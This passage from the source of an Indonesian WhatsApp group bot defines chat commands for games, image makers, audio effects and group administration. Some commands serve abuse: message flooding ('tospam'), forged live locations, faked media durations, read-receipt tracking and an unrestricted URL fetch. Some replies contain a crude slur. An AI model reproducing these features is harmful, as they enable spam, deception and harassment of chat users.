                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                        Fan.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `Nih Om`, quoted : ftrol})
                    })
                    break

                    // Ephoto 360 //
                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
              
                    if (args.length == 0) return reply(`Example: ${prefix + command} FanX7`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
                        Fan.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `Nih Om`, quoted : ftrol}) 
                    })
                    break


       
       case 'tebakgambar':            
if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/gambar?apikey=${lolkey}`)
get_result = get_result.result
ini_image = get_result.image
jawaban = get_result.answer
ini_buffer = await getBuffer(ini_image)
buff = await getBuffer(ini_image)

Fan.sendMessage(from, ini_buffer, image, { quoted: mek, caption: 'Silahkan jawab soal berikut ini\n\nPetunjuk :tebak sendirilah kontol\nWaktu : 30s' }).then(() => {
  tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
  fs.writeFileSync("./P2/tebakgambar.json", JSON.stringify(tebakgambar))
})
await sleep(30000)
if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
  console.log(color("Jawaban: " + jawaban))
  titid = "*Jawaban*: " + jawaban
  sendButMessage(from, titid, `Klik Untuk Ke Game Selanjutnya`, [
  {
 buttonId: `tebakgambar`,
 buttonText: {
displayText: `⬡ NEXT `,
 },
 type: 1,
  },]);

  delete tebakgambar[sender.split('@')[0]]
  fs.writeFileSync("./P2/tebakgambar.json", JSON.stringify(tebakgambar))
}
gameAdd(sender, glimit)
break
       case 'caklontong':         
              if (isGame(sender, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (caklontong.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/caklontong?apikey=${lolkey}`)
              get_result = get_result.result
              jawaban = get_result.answer
              ini_txt = `TEBAK SNDIRI`              
              pertanyaan = get_result.question
              Fan.sendMessage(from, '*+* ```Caklontong```\n\n *soal* :'+pertanyaan+'\n *kisi²* :'+ini_txt, text, { quoted: ftrol}).then(() => {
              caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./P2/caklontong.json", JSON.stringify(caklontong))
})
              await sleep(30000)
              if (caklontong.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete caklontong[sender.split('@')[0]]
              fs.writeFileSync("./P2/caklontong.json", JSON.stringify(caklontong))
}
              gameAdd(sender, glimit)
              break
//
                    case 'tourl':

    if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await Fan.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break
case 'viewonce':

res = await Fan.prepareMessageFromContent(from,{
"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": dfrply,
"viewOnce": true
}
}
}
}, {}) 
Fan.relayWAMessage(res)
break
case 'pinterest':
if (!q) return reply("")
pint = await pinterest (q)
Fan.sendMessage(from, {url: `${pint[Math.floor(Math.random() * pint.length)]}`}, image, {quoted: mek, thumbnail: Buffer.alloc(0), caption: "Nih Om"})
break
case 'isbaileys': 
case 'bail': 
case 'baileys':

reply(`${mek.quoted.isBaileys}`)
break
case 'getcaption':

try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}
break
case 'q': 

    if (!m.quoted) return reply('reply pesan!')
    let qse = Fan.serializeM(await m.getQuotedObj())
    if (!qse.quoted) return reply('pesan yang anda reply tidak mengandung reply!')
    await qse.quoted.copyNForward(m.chat, true)
break
case 'listgc':
case 'gclist':
case 'listgroup':
                case 'listgrup':
                case 'listgrop':
                case 'gruplist':
                case 'groplist':
                case 'grouplist':

  const txs = Fan.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${Fan.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  reply(txs)
  break
  case 'caripesan':

if (args.length < 1) return reply(`Penggunaan ${prefix}caripesan Hi|15`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return reply('maksimal 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
cok = await Fan.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Pesan tidak ditemukan!') 
if (cok.messages.length < parseInt(batas)) reply(`Hanya ditemukan ${cok.messages.length - 1} Pesan`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
Fan.sendMessage(from, `Nih pesannya!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
return reply(mess.error.api)
}
} else {
reply(`Penggunaan ${prefix}caripesan Hi|15`)
}
break
  case 'get':
case 'fetch':

            if(!c) return reply('Linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            reply(bu)
            })   
            break
            case 'autorespon':
      if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
           if (c === 'on'){
              autorespon = false
                    reply(`Berhasil mengaktifkan autorespon`)
                } else if (c === 'off'){
                    autorespon = true
                    reply(`Berhasil menonaktifkan autorespon`)
                } else if (!c) {
                    anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
const buttons = [{buttonId: 'autorespon on', buttonText: {displayText: 'ON✔️'}, type: 1},{buttonId: 'autorespon off', buttonText: {displayText: 'OFF✖️'}, type: 1}]
const btnharam = {
    contentText: `${anu}`,
    footerText: '*_Xavhier _*',
    buttons: buttons,
    headerType: 1
}
await Fan.sendMessage(from, btnharam, MessageType.buttonsMessage, {quoted: ftrol})
                }
                break
         
                case 'setprefix':
      if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
      if (args.length < 1) return reply(`Contoh ${prefix + command} multi/nopref`)
           if (c === 'multi'){
              multi = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else if (c === 'nopref'){
                    multi = false
                    nopref = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    reply(`Berhasil mengubah prefix ke ${c}`)
					}
					break
        case 'test':
				case 'cek':
				case 'tes':
				runtime = process.uptime()
				reply(`- SUDAH AKTIF BOS \n${waktu(runtime)}`)
				break
				case 'tictactoe':
case 'ttt':

if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('Tag Lawan Anda! ')
if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target Lawan!')
ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
player1 = sender
player2 = ment[0]
angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
id = from
gilir = player2
ky_ttt.push({player1,player2,id,angka,gilir})
Fan.sendMessage(from, `*🎳 Memulai Game Tictactoe 🎲*

[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ketik ${prefix}delttc , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
break
                case 'delttt':
                case 'delttc':

if (!isGroup) return reply(mess.only.group)
if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa 
reply('Sukses')
break
				case 'getpp':
					anu = from
		if (`${anu}@s.whatsapp.net`) {
		try {
					ppimg = await Fan.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				ano = await Fan.getProfilePicture(anu)
				buffer = await getBuffer(ano)
				Fan.sendMessage(from, buffer, image, {quoted: mek})
		} else {
		}
			  break
case 'mode':
buttonss = [{buttonId: `public`, buttonText: {displayText: 'PUBLIC👥'}, type: 1},{buttonId: `self`, buttonText: {displayText: 'SELF👤'}, type: 1}]
const buMess = {
    contentText: "SELF/PUBLIC",
    footerText: 'Silahkan Pilih Saah Satu',
    buttons: buttonss,
    headerType: 1
}
await Fan.sendMessage(from, buMess, MessageType.buttonsMessage, {quoted: ftrol})
break
				case 'public':
				if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
			publik = true
				reply('Sukses mengubah mode self ke public')
			break
			case 'self':
			if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
				publik = false
				reply('Sukses mengubah mode public ke self')
			break
		case 'gimage':
case 'googleimage':

if (args.length < 1) return reply('Apa Yang Mau Dicari?')
reply(`Bentar Nyett....`)
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Error TerFani Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: mek, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
break

				case 'herolist':

await herolist().then((ress) => {
let listt = `*List hero untuk feature ${prefix}herodetail*\n\n`
for (var i = 0; i < ress.hero.length; i++) {
listt += '-  ' + ress.hero[i] + '\n'
}
reply(listt)
})
break

case 'herodetail':

res = await herodetails(body.slice(12))
her = `*Hero Details ${body.slice(12)}*

*Nama* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Fitur Hero* : ${res.hero_feature}
*Spesial* : ${res.speciality}
*Rekomendasi Lane* : ${res.laning_recommendation}
*Harga* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Rilis* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 
*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}`
reply(her)
break
				case 'google':
case 'googlesearch':
case 'ggs':

if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = args.join(' ')
reply(`Bentar Nyett....`)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
case 'wiki':

if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
  reply(result)
})
break

case 'mediafire':
                
reply('Loading...')
if (!q) return reply(`Example : ${prefix + command} https://www.mediafire.com/download/v6hedu4r1ub6tty`)
lah = await fetchJson(`https://api.lolhuman.xyz/api/mediafire?apikey=${lolkey}&url=${q}`)
down = await getBuffer(lah.result.link)
Fan.sendMessage(from, down, document, { mimetype: 'application/zip', filename: lah.result.filename, quoted: mek, contextInfo: {mentionedJid: [sender]}})
break
				case 'kalkulator':

				 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
				case 'translate':
				case 'ts':

					try{
					if ( args.length === 1 ){
						tekss = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
						translate(tekss, {client: 'gtx', to:args[0]})
						.then((res) =>{
							reply(res.text)
							}) 
						} else
			if(args.length > 0 ) {
				ngab = args.join(' ')
			teks = ngab.split(' ')[0];
			bhs = ngab.split(' ')[1];
			  translate(teks, {client: 'gtx', to:bhs})
			  .then((res) =>{
				  reply(res.text)
				  })
				}
			} catch (e){
				reply(mess.error.api)
			}
				  break

				case 'pantun':
            
				anu = await fetchJson(`https://api.lolhuman.xyz/api/random/pantun?apikey=${lolkey}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				
					
					
				case 'dadu':
            
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./P1/sticker/${random}.webp`)
			Fan.sendMessage(from, damdu, sticker, {quoted: mek})
			break
				case 'robot':
            
encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await Fan.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
Fan.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
case 'gemuk':
            
					encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaz = await Fan.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					Fan.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
					break
case 'balik':
            
	encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	mediau = await Fan.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mediau} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediau)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
Fan.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
fs.unlinkSync(ran)
	})
break
case 'bass':                 
            
					encmediao = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediao = await Fan.downloadAndSaveMediaMessage(encmediao)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediao} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediao)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Fan.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
				break
case 'sider':
            
if (!isGroup) return reply(mess.only.group)
infom = await Fan.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
case 'tospam':
            
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  Fan.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  Fan.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await Fan.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  Fan.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await Fan.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  Fan.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await Fan.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  Fan.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
	case 'halloween':
            
	if (!arg) return reply(from, `Penggunaan ${prefix}halloween teks`, mek)
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${arg}&apikey=${HunterApi}`)
   break
   case 'vampire':
            
   if (!arg) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${arg}&apikey=${HunterApi}`)
   break
   case 'codetxt':
            
   if (!arg) return reply(from, `Penggunaan ${prefix}codetxt teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${arg}&apikey=${HunterApi}`)
   break
case 'matrix':
            
				if (!arg) return reply(from, `Penggunaan ${prefix}matrix teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${arg}&apikey=${HunterApi}`)
				break
				case 'googletxt':
            
				if (!arg) return reply(from, `Penggunaan ${prefix}googletxt teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${arg}&apikey=${HunterApi}`)
				break
				case 'spiderman':
            
				if (!arg) return reply(from, `Penggunaan ${prefix}sipderman teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${arg}&apikey=${HunterApi}`)
				break
				case 'express':
            
				if (!arg) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${arg}&apikey=${HunterApi}`)
				break
				case 'dance':
            
				if (!arg) return reply(from, `Penggunaan ${prefix}dance teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${arg}&apikey=${HunterApi}`)
				break
				case 'blackbird':
            
				if (!arg) return reply(from, `Penggunaan ${prefix}blackbird teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${arg}&apikey=${HunterApi}`)
				break
				case 'text3d':
            
				if (!arg) return reply(from, `Penggunaan ${prefix}text3d teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${arg}&apikey=${HunterApi}`)
				break
				case 'warrior':
            
				if (!arg) return reply(from, `Penggunaan ${prefix}warrior teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${arg}&apikey=${HunterApi}`)
				break
				case 'd':
				case 'del':
				case 'delete':
					Fan.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
				
				case 'readmore':
			    	case 'more':
            
			    	const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!c.includes('|')) return  reply(mess.error.api)
                    const text1 = c.substring(0, c.indexOf('|') - 0)
                    const text2 = c.substring(c.lastIndexOf('|') + 1)
                    reply( text1 + readmore + text2)
                    break
                    case 'delchat':
                    if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
                reply('Sukses menghapus chat' + from)
                await sleep(4000)
                Fan.modifyChat(from, ChatModification.delete)
                break
            
			
					case 'mute':
			    if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./P2/mute.json', JSON.stringify(mute))
                reply('Bot berhasil dimute di chat ini')
                break
					case 'restart':
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
reply(`_Restarting Xavhier ゑ_`)
exec(`cd &&  node index`)
sleep(4000)
reply('Sukses')
break
				case 'detikvn':
            
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await Fan.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						Fan.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
            
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await Fan.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						Fan.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
						fs.unlinkSync(median)
				break
				case "antivirtex":
        	
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(`Khusus Admin Om`)
			if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
					if (args[0] === 'on') {
						if (isAntivirtex) return reply('Sudah Aktif Kak')
						antilink.push(from)
						fs.writeFileSync('./P2/antivirtex.json', JSON.stringify(antilink))
						reply('Sukses mengaktifkan fitur antivirtex')
						Fan.sendMessage(from, `ALLERT!!! Group ini sudah di pasang antivirtex\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (args[0] === 'off') {
						if (!isAntivirtex) return reply('Sudah Mati Kak')
						var ini = antivirtex.indexOf(from)
						antivirtex.splice(ini, 1)
						fs.writeFileSync('./P2/antivirtex.json', JSON.stringify(antilink))
						reply('Sukses menonaktifkan fitur antivirtex')
					} else if (!c){
 anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
punten = [{buttonId: 'antivirtex off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'antivirtex on', buttonText: {displayText: 'ON✔️'}, type: 1}]
const btnasu = {
    contentText: `${anu}`,
    footerText: '*_Xavhier _*',
    buttons: punten,
    headerType: 1
}
await Fan.sendMessage(from, btnasu, MessageType.buttonsMessage, {quoted: ftrol})
					}
					break
		
				 
					 case 'antilink':
              if (!isRegistered) return reply(`daftar dlu om ketik .verify`)
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(`Khusus Admin Om`)
			if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
					if (args[0] === 'on') {
						if (isAntiLink) return reply('Sudah Aktif Kak')
						antilink.push(from)
						fs.writeFileSync('./P2/antilink.json', JSON.stringify(antilink))
						reply('Sukses mengaktifkan fitur antilink')
						Fan.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti link\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (args[0] === 'off') {
						if (!isAntiLink) return reply('Sudah Mati Kak')
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./P2/antilink.json', JSON.stringify(antilink))
						reply('Sukses menonaktifkan fitur antilink')
					} else if (!c){
 anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
punten = [{buttonId: 'antilink off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'antilink on', buttonText: {displayText: 'ON✔️'}, type: 1}]
const btnasu = {
    contentText: `${anu}`,
    footerText: '*_Xavhier _*',
    buttons: punten,
    headerType: 1
}
await Fan.sendMessage(from, btnasu, MessageType.buttonsMessage, {quoted: ftrol})
					}
					break
				case 'tinyurl':
            
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
break
case 'sharelock':
 
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
impostor = kntl.split("|")[1];
Fan.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: ofrply}, MessageType.liveLocation, {quoted:floc})
break
case 'tts':
            
					  try{
        if (args.length > 1) {
        const gtts = require('./P1/gtts')(args[0])
        if (args.length < 2) return Fan.sendMessage(from, 'Textnya mana gan?', text, {quoted: mek})
        ngab = budy.slice(7)
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        ngab.length > 600
        ? reply('Textnya kebanyakan gan')
        : gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                fs.unlinkSync(ranm)
                buff = fs.readFileSync(rano)
                if (err) return reply('Gagal gan:(')
                Fan.sendMessage(from, buff, audio, {quoted:mek,ptt:true})
                fs.unlinkSync(rano)
            })
        })
	} else if ( args.length === 1 ){
		ngab = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
		const gtts = require('./P1/gtts')(args[0])
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                fs.unlinkSync(ranm)
                buff = fs.readFileSync(rano)
                if (err) return reply(mess.error.api)
                Fan.sendMessage(from, buff, audio, {quoted:mek,ptt:true})
                fs.unlinkSync(rano)
            })
        })
	}
} catch (e){
	reply(mess.error.api)
}
break 
				case 'demote':
            
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return reply(`Khusus Admin Om`)
                   if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('reply targetnya!')
			demote = mek.message.extendedTextMessage.contextInfo.participant
		    Fan.groupDemoteAdmin(from, [demote])
						reply('Sukses demote admin')
						break
					case 'promote':
            
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(`Khusus Admin Om`)
                   if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
				  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('reply targetnya!')
			promote = mek.message.extendedTextMessage.contextInfo.participant
		    Fan.groupMakeAdmin(from, [promote])
						reply('Sukses promote member')
						break
				case 'linkgrup':
				case 'linkgroup':
				case 'linkgc':
            
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
					linkgc = await Fan.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink grup ${groupName}`
					Fan.sendMessage(from, yeh, text, { quoted: mek })
					break
					case 'resetlinkgc':
         case 'resetlinkgroup':
         case 'revoke':
            
         if (!isGroup) return reply(mess.only.group)
         if (!isGroupAdmins) return reply(`Khusus Admin Om`)
                   if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
          json = ['action', 'inviteReset', from]
         Fan.query({json, expect200: true})
          reply('Sukses Mereset Link Group')
         break
case 'gc': case 'group':
buttonss = [{buttonId: `opengc`, buttonText: {displayText: 'OPEN'}, type: 1},{buttonId: `closegc`, buttonText: {displayText: 'CLOSE'}, type: 1}]
const bMess = {
